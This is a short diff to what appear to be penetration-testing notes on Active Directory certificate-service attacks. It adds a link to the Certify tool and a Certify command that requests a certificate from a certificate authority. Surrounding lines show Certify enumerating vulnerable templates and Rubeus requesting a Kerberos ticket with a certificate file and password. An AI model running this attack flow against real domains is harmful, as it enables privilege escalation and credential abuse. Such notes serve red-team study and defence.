@@ -1358,7 +1358,7 @@ https://blog.harmj0y.net/activedirectory/certified-pre-owned/
 
 https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d
 
-
+https://github.com/GhostPack/Certify
 
 ```./certify.exe```
 
@@ -1402,5 +1402,7 @@ ESC8 web enrollment ca and spoolsample
 Attack flow -
 
 ```./certify.exe find /vulnerable```
+
+```Certify.exe request /ca:dc.ecorcp.com\ecorp-dc-ca /template:user```
 
 ```./Rubeus.exe asktgt /user:localadmin /certificate:C:\Temp\hi.pfx /password:Password01```
